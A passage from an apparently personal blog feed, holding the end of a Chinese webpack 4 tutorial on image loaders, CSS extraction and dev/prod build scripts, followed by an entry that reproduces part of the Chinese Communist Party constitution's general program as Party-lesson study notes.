class="hljs-number">50px</span>;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">50px</span>;<br>    <span class="hljs-attribute">border</span>: none;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们运行npm run build后发现打包后的index.css中是没有多余的<code>.a</code>和<code>.b</code>代码的：</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/24/16f374c31db42cc2~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p><ol start="5"><li>处理图片</li></ol><p>如果要使用图片，我们得安装两个loader</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">// 虽然我们只需使用url-loader，但url-loader是依赖于<span class="hljs-keyword">file</span>-loader的，所以也要安装<br>npm <span class="hljs-keyword">install</span> url-loader <span class="hljs-keyword">file</span>-loader -D 复制代码<br></code></pre></td></tr></table></figure><p>然后在webpack.common.js中配置url-loader</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> webpack.common.js<br>const path = require(<span class="hljs-string">&#x27;path&#x27;</span>);<br>const webpack = require(<span class="hljs-string">&#x27;webpack&#x27;</span>);  <span class="hljs-regexp">//</span> 这个插件不需要安装，是基于webpack的，需要引入webpack模块<br>const HtmlWebpackPlugin = require(<span class="hljs-string">&#x27;html-webpack-plugin&#x27;</span>); <span class="hljs-regexp">//</span> 引入HtmlWebpackPlugin插件<br>const ExtractTextPlugin = require(<span class="hljs-string">&#x27;extract-text-webpack-plugin&#x27;</span>) <span class="hljs-regexp">//</span>引入分离插件<br>module.exports = &#123;<br>    entry: &#123;<br>        index: path.join(__dirname, <span class="hljs-string">&quot;/src/index.js&quot;</span>),<br>        index2: path.join(__dirname, <span class="hljs-string">&quot;/src/index2.js&quot;</span>)<br>    &#125;,<br>    output: &#123;<br>        path: path.join(__dirname, <span class="hljs-string">&quot;/dist&quot;</span>), <span class="hljs-regexp">//</span> 打包后的文件存放的地方 <br>        filename: <span class="hljs-string">&quot;[name].js&quot;</span> <span class="hljs-regexp">//</span> 打包后输出文件的文件名<br>    &#125;,<br>    module: &#123;<br>        rules: [<br>            &#123;<br>                test: <span class="hljs-regexp">/\.css$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.css结尾的文件<br>                use: ExtractTextPlugin.extract(&#123;  <span class="hljs-regexp">//</span> 这里我们需要调用分离插件内的extract方法<br>                    fallback: <span class="hljs-string">&#x27;style-loader&#x27;</span>,  <span class="hljs-regexp">//</span> 相当于回滚，经css-loader处理过的css最终再经过style-loader处理<br>                    use: [<span class="hljs-string">&#x27;css-loader&#x27;</span>]<br>                &#125;)<br>            &#125;,<br>            &#123;<br>                test: <span class="hljs-regexp">/\.(scss|sass)$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.scss和.sass结尾的文件<br>                use: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>, <span class="hljs-string">&#x27;sass-loader&#x27;</span>]  <span class="hljs-regexp">//</span> 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的<br>            &#125;,<br>            &#123;<br>                test: <span class="hljs-regexp">/\.(png|jpg|svg|gif)$/</span>,  <span class="hljs-regexp">//</span> 正则匹配图片格式名<br>                use: [<br>                    &#123; loader: <span class="hljs-string">&#x27;url-loader&#x27;</span>  <span class="hljs-regexp">//</span> 使用url-loader &#125;<br>                ]<br>            &#125;,<br>        ]<br>    &#125;,<br>    plugins: [<br>        new webpack.BannerPlugin(<span class="hljs-string">&#x27;版权所有，翻版必究&#x27;</span>),  <span class="hljs-regexp">//</span> new一个插件的实例 <br>        new HtmlWebpackPlugin(&#123;<br>            template: path.join(__dirname, <span class="hljs-string">&quot;/src/index.html&quot;</span>)<span class="hljs-regexp">//</span> new一个这个插件的实例，并传入相关的参数<br>        &#125;),<br>        new webpack.HotModuleReplacementPlugin(), <span class="hljs-regexp">//</span> 热更新插件<br>        new ExtractTextPlugin(<span class="hljs-string">&#x27;css/index.css&#x27;</span>) <span class="hljs-regexp">//</span> 将css分离到/dist文件夹下的css文件夹中的index.css <br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>我们把index.css的背景改为图片</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* index.css */</span><br><span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;./images/bg.jpg&#x27;</span>) no-repeat;<br>    <span class="hljs-attribute">background-size</span>: <span class="hljs-number">200px</span> <span class="hljs-number">250px</span>;<br>    <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<br>&#125;复制代码<br></code></pre></td></tr></table></figure><p>运行npm run dev 后显示如下：</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/24/16f374c31f9e3bce~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p><p>我们会发现背景图片变成了base64，因为webpack会自动优化图片，减少发送请求，但是如果我想把它变成路径的该怎么做？</p><p>我们可以把webpack.common.js的loader配置更改一下，增加options选项：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs awk">module: &#123;<br>    rules: [<br>      &#123;<br>        test: <span class="hljs-regexp">/\.css$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.css结尾的文件<br>        use: ExtractTextPlugin.extract(&#123;  <span class="hljs-regexp">//</span> 这里我们需要调用分离插件内的extract方法<br>          fallback: <span class="hljs-string">&#x27;style-loader&#x27;</span>,  <span class="hljs-regexp">//</span> 相当于回滚，经css-loader处理过的css最终再经过style-loader处理<br>          use: [<span class="hljs-string">&#x27;css-loader&#x27;</span>],<br>          publicPath: <span class="hljs-string">&#x27;../&#x27;</span>  <span class="hljs-regexp">//</span> 给背景图片设置一个公共路径<br>        &#125;)<br>      &#125;,<br>      &#123;<br>        test: <span class="hljs-regexp">/\.(scss|sass)$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.scss和.sass结尾的文件<br>        use: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>, <span class="hljs-string">&#x27;sass-loader&#x27;</span>],  <span class="hljs-regexp">//</span> 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的<br>      &#125;,<br>      &#123;<br>        test: <span class="hljs-regexp">/\.(png|jpg|svg|gif)$/</span>,  <span class="hljs-regexp">//</span> 正则匹配图片格式名<br>        use: [<br>          &#123;<br>            loader: <span class="hljs-string">&#x27;url-loader&#x27;</span>,  <span class="hljs-regexp">//</span> 使用url-loader<br>            options: &#123;<br>              limit: <span class="hljs-number">1000</span>,  <span class="hljs-regexp">//</span> 限制只有小于<span class="hljs-number">1</span>kb的图片才转为base64，例子图片为<span class="hljs-number">1.47</span>kb,所以不会被转化<br>              outputPath: <span class="hljs-string">&#x27;images&#x27;</span>,  <span class="hljs-regexp">//</span> 设置打包后图片存放的文件夹名称<br>            &#125;,<br>          &#125;<br>        ]<br>      &#125;,<br>    ]<br>  &#125;,<br></code></pre></td></tr></table></figure><ol start="6"><li>压缩代码</li></ol><p>在webpack4.x版本中当你打包时会自动把js压缩了，而且npm run dev运行服务器时，当你修改代码时，热更新很慢，这是因为你修改后webpack又自动为你打包，这就导致了在开发环境中效率很慢，所以我们需要把开发环境和生产环境区分开来，这时就体现出我们代码分离的便捷性了，webpack.dev.js代表开发环境的配置，webpack.prod.js代表生产环境的配置，这时我们只要在package.json文件中配置对应环境的命令即可：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;build&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;webpack --config webpack.prod.js --mode production&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;dev&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;webpack-dev-server --open --config webpack.dev.js --mode development&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>复制代码<br></code></pre></td></tr></table></figure><p>–mode production表示打包时是生产环境，会自己将js进行压缩，而–mode development表示当前是开发环境，不需要进行压缩。这同时也解决了之前一直遗留的警告问题</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/24/16f374c336f83e41~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p><h1 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h1><p>因为webpack版本变更，上文部分内容无法在webpack 5+版本复现，但功能一脉相承，经实验，将可运行的webpack版本传至<a href="github.com/azureabaaba/webpack">此处</a>。</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>webpack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>党课</title>
    <link href="/blog/2022/11/20/%E5%85%9A%E8%AF%BE/"/>
    <url>/blog/2022/11/20/%E5%85%9A%E8%AF%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="党章"><a href="#党章" class="headerlink" title="党章"></a>党章</h1><p>2022.11.28</p><h2 id="x3D-x3D-总-纲-x3D-x3D"><a href="#x3D-x3D-总-纲-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;总　纲&#x3D;&#x3D;"></a>&#x3D;&#x3D;总　纲&#x3D;&#x3D;</h2><p>　　中国共产党是中国工人阶级的先锋队，同时是中国人民和中华民族的先锋队，是中国特色社会主义事业的领导核心，代表中国先进生产力的发展要求，代表中国先进文化的前进方向，代表中国最广大人民的根本利益。党的最高理想和最终目标是实现共产主义。</p><p>　　中国共产党以马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想作为自己的行动指南。</p><p>　　马克思列宁主义揭示了人类社会历史发展的规律，它的基本原理是正确的，具有强大的生命力。中国共产党人追求的共产主义最高理想，只有在社会主义社会充分发展和高度发达的基础上才能实现。社会主义制度的发展和完善是一个长期的历史过程。坚持马克思列宁主义的基本原理，走中国人民自愿选择的适合中国国情的道路，中国的社会主义事业必将取得最终的胜利。</p><p>　　以毛泽东同志为主要代表的中国共产党人，把马克思列宁主义的基本原理同中国革命的具体实践结合起来，创立了毛泽东思想。毛泽东思想是马克思列宁主义在中国的运用和发展，是被实践证明了的关于中国革命和建设的正确的理论原则和经验总结，是中国共产党集体智慧的结晶。在毛泽东思想指引下，中国共产党领导全国各族人民，经过长期的反对帝国主义、封建主义、官僚资本主义的革命斗争，取得了新民主主义革命的胜利，建立了人民民主专政的中华人民共和国；新中国成立以后，顺利地进行了社会主义改造，完成了从新民主主义到社会主义的过渡，确立了社会主义基本制度，发展了社会主义的经济、政治和文化。</p><p>　　十一届三中全会以来，以邓小平同志为主要代表的中国共产党人，总结新中国成立以来正反两方面的经验，解放思想，实事求是，实现全党工作中心向经济建设的转移，实行改革开放，开辟了社会主义事业发展的新时期，逐步形成了建设中国特色社会主义的路线、方针、政策，阐明了在中国建设社会主义、巩固和发展社会主义的基本问题，创立了邓小平理论。邓小平理论是马克思列宁主义的基本原理同当代中国实践和时代特征相结合的产物，是毛泽东思想在新的历史条件下的继承和发展，是马克思主义在中国发展的新阶段，是当代中国的马克思主义，是中国共产党集体智慧的结晶，引导着我国社会主义现代化事业不断前进。</p><p>　　十三届四中全会以来，以江泽民同志为主要代表的中国共产党人，在建设中国特色社会主义的实践中，加深了对什么是社会主义、怎样建设社会主义和建设什么样的党、怎样建设党的认识，积累了治党治国新的宝贵经验，形成了“三个代表”重要思想。“三个代表”重要思想是对马克思列宁主义、毛泽东思想、邓小平理论的继承和发展，反映了当代世界和中国的发展变化对党和国家工作的新要求，是加强和改进党的建设、推进我国社会主义自我完善和发展的强大理论武器，是中国共产党集体智慧的结晶，是党必须长期坚持的指导思想。始终做到“三个代表”，是我们党的立党之本、执政之基、力量之源。</p><p>　　十六大以来，以胡锦涛同志为主要代表的中国共产党人，坚持以邓小平理论和“三个代表”重要思想为指导，根据新的发展要求，深刻认识和回答了新形势下实现什么样的发展、怎样发展等重大问题，形成了以人为本、全面协调可持续发展的科学发展观。科学发展观是同马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想既一脉相承又与时俱进的科学理论，是马克思主义关于发展的世界观和方法论的集中体现，是马克思主义中国化重大成果，是中国共产党集体智慧的结晶，是发展中国特色社会主义必须长期坚持的指导思想。</p><p>　　十八大以来，以习近平同志为主要代表的中国共产党人，坚持把马克思主义基本原理同中国具体实际相结合、同中华优秀传统文化相结合，科学回答了新时代坚持和发展什么样的中国特色社会主义、怎样坚持和发展中国特色社会主义等重大时代课题，创立了习近平新时代中国特色社会主义思想。习近平新时代中国特色社会主义思想是对马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观的继承和发展，是当代中国马克思主义、二十一世纪马克思主义，是中华文化和中国精神的时代精华，是党和人民实践经验和集体智慧的结晶，是中国特色社会主义理论体系的重要组成部分，是全党全国人民为实现中华民族伟大复兴而奋斗的行动指南，必须长期坚持并不断发展。在习近平新时代中国特色社会主义思想指导下，中国共产党领导全国各族人民，统揽伟大斗争、伟大工程、伟大事业、伟大梦想，推动中国特色社会主义进入了新时代，实现第一个百年奋斗目标，开启了实现第二个百年奋斗目标新征程。</p><p>　　改革开放以来我们取得一切成绩和进步的根本原因，归结起来就是：开辟了中国特色社会主义道路，形成了中国特色社会主义理论体系，确立了中国特色社会主义制度，发展了中国特色社会主义文化。全党同志要倍加珍惜、长期坚持和不断发展党历经艰辛开创的这条道路、这个理论体系、这个制度、这个文化，高举中国特色社会主义伟大旗帜，坚定道路自信、理论自信、制度自信、文化自信，发扬斗争精神，增强斗争本领，贯彻党的基本理论、基本路线、基本方略，为实现推进现代化建设、完成祖国统一、维护世界和平与促进共同发展这三大历史任务，实现第二个百年奋斗目标、实现中华民族伟大复兴的中国梦而奋斗。</p><p>　　中国共产党自成立以来，始终把为中国人民谋幸福、为中华民族谋复兴作为自己的初心使命，历经百年奋斗，从根本上改变了中国人民的前途命运，开辟了实现中华民族伟大复兴的正确道路，展示了马克思主义的强大生命力，深刻影响了世界历史进程，锻造了走在时代前列的中国共产党。经过长期实践，积累了坚持党的领导、坚持人民至上、坚持理论创新、坚持独立自主、坚持中国道路、坚持胸怀天下、坚持开拓创新、坚持敢于斗争、坚持统一战线、坚持自我革命的宝贵历史经验，这是党和人民共同创造的精神财富，必须倍加珍惜、长期坚持，并在实践中不断丰富和发展。</p><p>　　我国正处于并将长期处于社会主义初级阶段。这是在原本经济文化落后的中国建设社会主义现代化不可逾越的历史阶段，需要上百年的时间。我国的社会主义建设，必须从我国的国情出发，走中国特色社会主义道路，以中国式现代化全面推进中华民族伟大复兴。在现阶段，我国社会的主要矛盾是人民日益增长的美好生活需要和不平衡不充分的发展之间的矛盾。由于国内的因素和国际的影响，阶级斗争还在一定范围内长期存在，在某种条件下还有可能激化，但已经不是主要矛盾。我国社会主义建设的根本任务，是进一步解放生产力，发展生产力，逐步实现社会主义现代化，并且为此而改革生产关系和上层建筑中不适应生产力发展的方面和环节。必须坚持和完善公有制为主体、多种所有制经济共同发展，按劳分配为主体、多种分配方式并存，社会主义市场经济体制等基本经济制度，鼓励一部分地区和一部分人先富起来，逐步实现全体人民共同富裕，在生产发展和社会财富增长的基础上不断满足人民日益增长的美好生活需要，促进人的全面发展。发展是我们党执政兴国的第一要务。必须坚持以人民为中心的发展思想，把握新发展阶段，贯彻创新、协调、绿色、开放、共享的新发展理念，加快构建以国内大循环为主体、国内国际双循环相互促进的新发展格局，推动高质量发展。各项工作都要把有利于发展社会主义社会的生产力，有利于增强社会主义国家的综合国力，有利于提高人民的生活水平，作为总的出发点和检验标准，尊重劳动、尊重知识、尊重人才、尊重创造，做到发展为了人民、发展依靠人民、发展成果由人民共享。必须按照中国特色社会主义事业“五位一体”总体布局和“四个全面”战略布局，统筹推进经济建设、政治建设、文化建设、社会建设、生态文明建设，协调推进全面建设社会主义现代化国家、全面深化改革、全面依法治国、全面从严治党。新时代新征程，经济和社会发展的战略目标是，到二〇三五年基本实现社会主义现代化，到本世纪中叶把我国建成社会主义现代化强国。</p><p>　　中国共产党在社会主义初级阶段的基本路线是：领导和团结全国各族人民，以经济建设为中心，坚持四项基本原则，坚持改革开放，自力更生，艰苦创业，为把我国建设成为富强民主文明和谐美丽的社会主义现代化强国而奋斗。</p><p>　　中国共产党在领导社会主义事业中，必须坚持以经济建设为中心，其他各项工作都服从和服务于这个中心。要实施科教兴国战略、人才强国战略、创新驱动发展战略、乡村振兴战略、区域协调发展战略、可持续发展战略、军民融合发展战略，充分发挥科学技术作为第一生产力的作用，充分发挥人才作为第一资源的作用，充分发挥创新作为引领发展第一动力的作用，依靠科技进步，提高劳动者素质，促进国民经济更高质量、更有效率、更加公平、更可持续、更为安全发展。</p><p>　　坚持社会主义道路、坚持人民民主专政、坚持中国共产党的领导、坚持马克思列宁主义毛泽东思想这四项基本原则，是我们的立国之本。在社会主义现代化建设的整个过程中，必须坚持四项基本原则，反对资产阶级自由化。</p><p>　　坚持改革开放，是我们的强国之路。只有改革开放，才能发展中国、发展社会主义、发展马克思主义。要全面深化改革，完善和发展中国特色社会主义制度，推进国家治理体系和治理能力现代化。要从根本上改革束缚生产力发展的经济体制，坚持和完善社会主义市场经济体制；与此相适应，要进行政治体制改革和其他领域的改革。要坚持对外开放的基本国策，吸收和借鉴人类社会创造的一切文明成果。改革开放应当大胆探索，勇于开拓，提高改革决策的科学性，更加注重改革的系统性、整体性、协同性，在实践中开创新路。</p><p>　　中国共产党领导人民发展社会主义市场经济。毫不动摇地巩固和发展公有制经济，毫不动摇地鼓励、支持、引导非公有制经济发展。发挥市场在资源配置中的决定性作用，更好发挥政府作用，建立完善的宏观调控体系。统筹城乡发展、区域发展、经济社会发展、人与自然和谐发展、国内发展和对外开放，调整经济结构，转变经济发展方式，推进供给侧结构性改革。促进新型工业化、信息化、城镇化、农业现代化同步发展，建设社会主义新农村，走中国特色新型工业化道路，建设创新型国家和世界科技强国。</p><p>　　中国共产党领导人民发展社会主义民主政治。坚持党的领导、人民当家作主、依法治国有机统一，走中国特色社会主义政治发展道路、中国特色社会主义法治道路，扩大社会主义民主，建设中国特色社会主义法治体系，建设社会主义法治国家，巩固人民民主专政，建设社会主义政治文明。坚持和完善人民代表大会制度、中国共产党领导的多党合作和政治协商制度、民族区域自治制度以及基层群众自治制度。发展更加广泛、更加充分、更加健全的全过程人民民主，推进协商民主广泛多层制度化发展，切实保障人民管理国家事务和社会事务、管理经济和文化事业的权利。尊重和保障人权。广开言路，建立健全民主选举、民主协商、民主决策、民主管理、民主监督的制度和程序。完善中国特色社会主义法律体系，加强法律实施工作，实现国家各项工作法治化。</p><p>　　中国共产党领导人民发展社会主义先进文化。建设社会主义精神文明，实行依法治国和以德治国相结合，提高全民族的思想道德素质和科学文化素质，为改革开放和社会主义现代化建设提供强大的思想保证、精神动力和智力支持，建设社会主义文化强国。加强社会主义核心价值体系建设，坚持马克思主义指导思想，树立中国特色社会主义共同理想，弘扬以爱国主义为核心的民族精神和以改革创新为核心的时代精神，培育和践行社会主义核心价值观，倡导社会主义荣辱观，增强民族自尊、自信和自强精神，抵御资本主义和封建主义腐朽思想的侵蚀，扫除各种社会丑恶现象，努力使我国人民成为有理想、有道德、有文化、有纪律的人民。对党员要进行共产主义远大理想教育。大力发展教育、科学、文化事业，推动中华优秀传统文化创造性转化、创新性发展，继承革命文化，发展社会主义先进文化，提高国家文化软实力。牢牢掌握意识形态工作领导权，不断巩固马克思主义在意识形态领域的指导地位，巩固全党全国人民团结奋斗的共同思想基础。</p><p>　　中国共产党领导人民构建社会主义和谐社会。按照民主法治、公平正义、诚信友爱、充满活力、安定有序、人与自然和谐相处的总要求和共同建设、共同享有的原则，以保障和改善民生为重点，解决好人民最关心、最直接、最现实的利益问题，使发展成果更多更公平惠及全体人民，不断增强人民群众获得感，努力形成全体人民各尽其能、各得其所而又和谐相处的局面。加强和创新社会治理。严格区分和正确处理敌我矛盾和人民内部矛盾这两类不同性质的矛盾。加强社会治安综合治理，依法坚决打击各种危害国家安全和利益、危害社会稳定和经济发展的犯罪活动和犯罪分子，保持社会长期稳定。坚持总体国家安全观，统筹发展和安全，坚决维护国家主权、安全、发展利益。</p><p>　　中国共产党领导人民建设社会主义生态文明。树立尊重自然、顺应自然、保护自然的生态文明理念，增强绿水青山就是金山银山的意识，坚持节约资源和保护环境的基本国策，坚持节约优先、保护优先、自然恢复为主的方针，坚持生产发展、生活富裕、生态良好的文明发展道路。着力建设资源节约型、环境友好型社会，实行最严格的生态环境保护制度，形成节约资源和保护环境的空间格局、产业结构、生产方式、生活方式，为人民创造良好生产生活环境，实现中华民族永续发展。</p><p>　　中国共产党坚持对人民解放军和其他人民武装力量的绝对领导，贯彻习近平强军思想，加强人民解放军的建设，坚持政治建军、改革强军、科技强军、人才强军、依法治军，建设一支听党指挥、能打胜仗、作风优良的人民军队，把人民军队建设成为世界一流军队，切实保证人民解放军有效履行新时代军队使命任务，充分发挥人民解放军在巩固国防、保卫祖国和参加社会主义现代化建设中的作用。</p><p>　　中国共产党维护和发展平等团结互助和谐的社会主义民族关系，积极培养、选拔少数民族干部，帮助少数民族和民族地区发展经济、文化和社会事业，铸牢中华民族共同体意识，实现各民族共同团结奋斗、共同繁荣发展。全面贯彻党的宗教工作基本方针，团结信教群众为经济社会发展作贡献。</p><p>　　中国共产党同全国各民族工人、农民、知识分子团结在一起，同各民主党派、无党派人士、各民族的爱国力量团结在一起，进一步发展和壮大由全体社会主义劳动者、社会主义事业的建设者、拥护社会主义的爱国者、拥护祖国统一和致力于中华民族伟大复兴的爱国者组成的最广泛的爱国统一战线。不断加强全国人民包括香港特别行政区同胞、澳门特别行政区同胞、台湾同胞和海外侨胞的团结。全面准确、坚定不移贯彻“一个国家、两种制度”的方针，促进香港、澳门长期繁荣稳定，坚决反对和遏制“台独”，完成祖国统一大业。</p><p>　　中国共产党坚持独立自主的和平外交政策，坚持和平发展道路，坚持互利共赢的开放战略，统筹国内国际两个大局，积极发展对外关系，努力为我国的改革开放和现代化建设争取有利的国际环境。在国际事务中，弘扬和平、发展、公平、正义、民主、自由的全人类共同价值，坚持正确义利观，维护我国的独立和主权，反对霸权主义和强权政治，维护世界和平，促进人类进步，推动构建人类命运共同体，推动建设持久和平、普遍安全、共同繁荣、开放包容、清洁美丽的世界。在互相尊重主权和领土完整、互不侵犯、互不干涉内政、平等互利、和平共处五项原则的基础上，发展我国同世界各国的关系。不断发展我国同周边国家的睦邻友好关系，加强同发展中国家的团结与合作。遵循共商共建共享原则，推进“一带一路”建设。按照独立自主、完全平等、互相尊重、互不干涉内部事务的原则，发展我党同各国共产党和其他政党的关系。</p><p>　　中国共产党要领导全国各族人民实现第二个百年奋斗目标、实现中华民族伟大复兴的中国梦，必须紧密围绕党的基本路线，坚持和加强党的全面领导，坚持党要管党、全面从严治党，弘扬坚持真理、坚守理想，践行初心、担当使命，不怕牺牲、英勇斗争，对党忠诚、不负人民的伟大建党精神，加强党的长期执政能力建设、先进性和纯洁性建设，以改革创新精神全面推进党的建设新的伟大工程，以党的政治建设为统领，全面推进党的政治建设、思想建设、组织建设、作风建设、纪律建设，把制度建设贯穿其中，深入推进反腐败斗争，全面提高党的建设科学化水平，以伟大自我革命引领伟大社会革命。坚持立党为公、执政为民，发扬党的优良传统和作风，不断提高党的领导水平和执政水平，提高拒腐防变和抵御风险的能力，不断增强自我净化、自我完善、自我革新、自我提高能力，不断增强党的阶级基础和扩大党的群众基础，不断提高党的创造力、凝聚力、战斗力，建设学习型、服务型、创新型的马克思主义执政党，使我们党始终走在时代前列，成为领导全国人民沿着中国特色社会主义道路不断前进的坚强核心。党的建设必须坚决实现以下六项基本要求：</p><p>　　第一，坚持党的基本路线。全党要用邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想和党的基本路线统一思想，统一行动，并且毫不动摇地长期坚持下去。必须把改革开放同四项基本原则统一起来，全面落实党的基本路线，反对一切“左”的和右的错误倾向，要警惕右，但主要是防止“左”。必须提高政治判断力、政治领悟力、政治执行力，增强贯彻落实党的理论和路线方针政策的自觉性和坚定性。</p><p>　　第二，坚持解放思想，实事求是，与时俱进，求真务实。党的思想路线是一切从实际出发，理论联系实际，实事求是，在实践中检验真理和发展真理。全党必须坚持这条思想路线，积极探索，大胆试验，开拓创新，创造性地开展工作，不断研究新情况，总结新经验，解决新问题，在实践中丰富和发展马克思主义，推进马克思主义中国化时代化。</p><p>　　第三，坚持新时代党的组织路线。全面贯彻习近平新时代中国特色社会主义思想，以组织体系建设为重点，着力培养忠诚干净担当的高素质干部，着力集聚爱国奉献的各方面优秀人才，坚持德才兼备、以德为先、任人唯贤，为坚持和加强党的全面领导、坚持和发展中国特色社会主义提供坚强组织保证。全党必须增强党组织的政治功能和组织功能，培养选拔党和人民需要的好干部，培养和造就大批堪当时代重任的社会主义事业接班人，聚天下英才而用之，从组织上保证党的基本理论、基本路线、基本方略的贯彻落实。</p><p>　　第四，坚持全心全意为人民服务。党除了工人阶级和最广大人民群众的利益，没有自己特殊的利益。党在任何时候都把群众利益放在第一位，同群众同甘共苦，保持最密切的联系，坚持权为民所用、情为民所系、利为民所谋，不允许任何党员脱离群众，凌驾于群众之上。我们党的最大政治优势是密切联系群众，党执政后的最大危险是脱离群众。党风问题、党同人民群众联系问题是关系党生死存亡的问题。党在自己的工作中实行群众路线，一切为了群众，一切依靠群众，从群众中来，到群众中去，把党的正确主张变为群众的自觉行动。</p><p>　　第五，坚持民主集中制。民主集中制是民主基础上的集中和集中指导下的民主相结合。它既是党的根本组织原则，也是群众路线在党的生活中的运用。必须充分发扬党内民主，尊重党员主体地位，保障党员民主权利，发挥各级党组织和广大党员的积极性创造性。必须实行正确的集中，牢固树立政治意识、大局意识、核心意识、看齐意识，坚定维护以习近平同志为核心的党中央权威和集中统一领导，保证全党的团结统一和行动一致，保证党的决定得到迅速有效的贯彻执行。加强和规范党内政治生活，增强党内政治生活的政治性、时代性、原则性、战斗性，发展积极健康的党内政治文化，营造风清气正的良好政治生态。党在自己的政治生活中正确地开展批评和自我批评，在原则问题上进行思想斗争，坚持真理，修正错误。努力造成又有集中又有民主，又有纪律又有自由，又有统一意志又有个人心情舒畅生动活泼的政治局面。</p><p>　　第六，坚持从严管党治党。全面从严治党永远在路上，党的自我革命永远在路上。新形势下，党面临的执政考验、改革开放考验、市场经济考验、外部环境考验是长期的、复杂的、严峻的，精神懈怠危险、能力不足危险、脱离群众危险、消极腐败危险更加尖锐地摆在全党面前。要把严的标准、严的措施贯穿于管党治党全过程和各方面。坚持依规治党、标本兼治，不断健全党内法规体系，坚持把纪律挺在前面，加强组织性纪律性，在党的纪律面前人人平等。强化全面从严治党主体责任和监督责任，加强对党的领导机关和党员领导干部特别是主要领导干部的监督，不断完善党内监督体系。深入推进党风廉政建设和反腐败斗争，以零容忍态度惩治腐败，一体推进不敢腐、不能腐、不想腐。</p><p>　　